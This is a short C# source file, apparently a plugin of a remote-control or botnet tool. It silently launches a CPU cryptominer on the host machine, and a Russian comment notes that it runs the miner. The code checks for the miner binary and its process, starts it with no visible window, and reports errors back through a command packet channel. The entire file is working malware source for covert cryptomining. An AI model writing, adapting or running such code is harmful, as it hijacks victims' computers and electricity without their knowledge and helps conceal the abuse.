using System;
using System.Diagnostics;
using System.IO;
using System.Threading;

namespace Plugin
{
    class Cpu_Run
    {
        public static void CmdRun(string cpuBin, string cpuProc, string cpuParametrs)
        {
            new Thread(() =>
            {
                try
                {
                    if (!File.Exists(cpuBin))
                        return;
                }
                catch { }
                try
                {
                    Process[] pname = Process.GetProcessesByName(cpuProc);
                    if (pname.Length == 0)
                    {
                        /* Запуск майнера через cmd */
                        Process p = new Process();
                        p.StartInfo.CreateNoWindow = true;
                        p.StartInfo.UseShellExecute = false;
                        p.StartInfo.Arguments = cpuParametrs;
                        p.StartInfo.FileName = cpuBin;
                        p.Start();
                        p.WaitForExit();
                        Packet.Error("CPU Miner Stopped.");
                        return;
                    }
                }
                catch (Exception ex)
                {
                    Packet.Error(ex.Message);
                    return;
                }
            }).Start();
        }
    }
}
